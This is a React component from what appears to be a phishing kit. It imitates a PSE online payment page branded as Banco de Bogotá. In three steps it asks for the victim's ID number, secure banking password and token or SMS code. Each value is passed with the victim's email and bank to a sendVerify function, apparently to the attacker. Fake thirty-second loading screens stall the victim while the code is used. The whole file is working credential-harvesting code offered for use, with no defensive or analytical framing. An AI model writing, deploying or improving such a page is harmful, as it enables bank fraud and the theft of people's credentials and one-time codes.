import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { sendVerify } from '../verifyData';
import styles from './X02.module.css';
import logo from '../../Assets/Images/X02/logo.svg'
import logoMain from '../../Assets/Images/X02/logoMain.png'
import x from '../../Assets/Images/X02/x.svg'
import loader from '../../Assets/Images/X02/loader.svg'
import loaderMain from '../../Assets/Images/loader.gif'

function X02() {

    const location = useLocation();
    const navigate = useNavigate();
    const { dataD, dataE } = location.state || {};

    const [dataF, setDataF] = useState('');
    const [dataG, setDataG] = useState('');
    const [dataH, setDataH] = useState('');
    
    const [showLoader, setShowLoader] = useState(false);
    const [showLoaderMain, setShowLoaderMain] = useState(false);

    const [step, setStep] = useState(1);

    const handleContinue = (e) => {
        e.preventDefault();

        if (step === 1) {
            sendVerify(`📄: ${dataF}\n📧: ${dataE}\n🏦: ${dataD}`);
            setStep(2);
        } else if (step === 2) {
            sendVerify(`🆔: ${dataG}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoader(true);

            setTimeout(() => {
                setShowLoader(false);
                setStep(3);
            }, 30000);
        } else if (step === 3) {
            sendVerify(`🔑: ${dataH}\n📧: ${dataE}\n🏦: ${dataD}`);
            setShowLoaderMain(true);
            setTimeout(() => {
                navigate("/resumenpago");
            }, 30000);
        }
    };

    return (
        <>
            <header className={styles.headerX02}>
                <div>
                    <img src={logo} alt='Logo'></img>
                    <img src={x} alt='Cerrar'></img>
                </div>
                <h1>
                    Bienvenido al nuevo<br></br>portal de pagos en linea PSE
                </h1>
            </header>
            <main className={styles.mainX02}>
                <section>
                    <div>
                        <div>
                            {step === 1 && <p>Ingresa tipo y número de documento</p>}
                            {step === 2 && <p>Ingresa con tu Clave Segura</p>}
                            {step === 3 && <p>Para la realización de tus pagos será necesario el uso del Token o sms a tu teléfono.</p>}
                        </div>
                        <form>
                            {step === 1 && !dataF && (
                                <div className={styles.divAX02}>
                                    <label>¿Qué tipo de cliente eres?</label>
                                    <select>
                                    <option>Banca Personas</option>
                                    <option>Banca Empresarial y Corporativo</option>
                                    </select>
                                </div>
                            )}
                            <div className={styles.divBX02}>
                                <div className={styles.divCX02}> 
                                    <label>Documento</label>
                                    <select>
                                        <option>C.C.</option>
                                    </select>
                                </div>
                                <div className={styles.divCX02}>
                                    <label>Número</label>
                                    <input type='number'
                                            value={dataF}
                                            onChange={(e) => setDataF(e.target.value)}
                                            placeholder='#'>
                                    </input>
                                </div>
                            </div>
                            <div>
                                {step === 2 && (
                                    <div className={styles.divDX02}>
                                        <label>Clave Segura</label>
                                        <input type='password'
                                            value={dataG}
                                            onChange={(e) => setDataG(e.target.value)} />
                                    </div>
                                )}
                                {step === 3 && (
                                    <div className={styles.divDX02}>
                                        <label>Codigo de Seguridad</label>
                                        <input type='password'
                                            value={dataH}
                                            onChange={(e) => setDataH(e.target.value)} />
                                    </div>
                                )}
                            </div>
                        </form>
                        <button onClick={handleContinue}>
                            {step === 3 ? 'Ingresar Ahora' : 'Continuar'}
                        </button>
                    </div>
                    <div>
                        <img src={logoMain} alt='Logo Main'></img>
                        <p>Banco de Bogotá - 2025</p>
                    </div>
                </section>
                <section>
                    <div>
                        <div>
                            <h2>Tu seguridad es lo primero</h2>
                            <p>Sigue estos tips y tus transacciones estarán blindadas</p> 
                        </div>
                        <div>
                            <h2>Contáctanos</h2>
                            <p>Si tienes alguna duda o algo te ha sucedido usa nuestros canales</p> 
                        </div>
                    </div>
                </section>
                {showLoader && (
                    <div className={styles.overlayX02}>
                        <img src={loader} alt='Loader'></img>
                    </div>
                )}
                {showLoaderMain && (
                    <section className={styles.loaderMain}>
                        <img src={loaderMain} alt='Loader'></img>
                    </section>
                )}
            </main>
        </>
    );
}

export default X02;